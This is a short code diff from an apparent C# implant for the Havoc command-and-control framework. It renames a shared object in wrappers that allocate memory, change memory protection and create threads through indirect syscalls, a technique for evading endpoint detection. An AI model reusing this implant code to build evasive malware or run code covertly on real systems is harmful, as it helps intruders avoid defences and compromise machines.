@@ -36,14 +36,14 @@ namespace HavocImplant.AgentFunctions.BofExec.Internals
         public static IntPtr NtAllocateVirtualMemory(IntPtr baseAddress, uint RegionSize, uint allocationType, uint protect )
         {
             object[] args = new object[] { (IntPtr)(-1), baseAddress, IntPtr.Zero, (IntPtr)RegionSize, allocationType, protect  };
-            globalNtdll.ntdll.indirectSyscallInvoke<Delegates.NtAllocateVirtualMemory>("NtAllocateVirtualMemory", args);
+            globalDll.ntdll.indirectSyscallInvoke<Delegates.NtAllocateVirtualMemory>("NtAllocateVirtualMemory", args);
             return (IntPtr)args[1];
         }
         // Originally used VirtualFree, made a wrapper for less overhead
         public static bool NtFreeVirtualMemory(IntPtr pAddress, uint size, uint freeType)
         {
             object[] args = new object[] { (IntPtr)(-1), pAddress, (IntPtr)size, freeType};
-            uint status = (uint)globalNtdll.ntdll.indirectSyscallInvoke<Delegates.NtFreeVirtualMemory>("NtFreeVirtualMemory", args);
+            uint status = (uint)globalDll.ntdll.indirectSyscallInvoke<Delegates.NtFreeVirtualMemory>("NtFreeVirtualMemory", args);
             //if ((status >= 0 && status <= 0x3FFFFFFF) || (status >= 0x40000000 && status <= 0x7FFFFFFF)) return true; 
             if (status == 0) return true; //idk which one is the real ntstatus success
             return false;
@@ -75,7 +75,7 @@ namespace HavocImplant.AgentFunctions.BofExec.Internals
         {
             IntPtr hThread = IntPtr.Zero;
             object[] threadargs = new object[] { hThread, (uint)0x02000000, IntPtr.Zero, (IntPtr)(-1), lpStartAddress, param, false, 0, 0, 0, lpThreadAttributes };
-            globalNtdll.ntdll.indirectSyscallInvoke<Delegates.NtCreateThreadEx>("NtCreateThreadEx", threadargs);
+            globalDll.ntdll.indirectSyscallInvoke<Delegates.NtCreateThreadEx>("NtCreateThreadEx", threadargs);
             return (IntPtr)threadargs[0];
         }
 
@@ -84,7 +84,7 @@ namespace HavocImplant.AgentFunctions.BofExec.Internals
         {
             lpflOldProtect = 0;
             object[] args = new object[] { (IntPtr)(-1), lpAddress, (IntPtr)(long)dwSize, flNewProtect, lpflOldProtect };
-            uint status = (uint)globalNtdll.ntdll.indirectSyscallInvoke<Delegates.NtProtectVirtualMemory>("NtProtectVirtualMemory", args);
+            uint status = (uint)globalDll.ntdll.indirectSyscallInvoke<Delegates.NtProtectVirtualMemory>("NtProtectVirtualMemory", args);
             lpflOldProtect = (uint)args[4];
             if (status == 0) return true;
             return false;
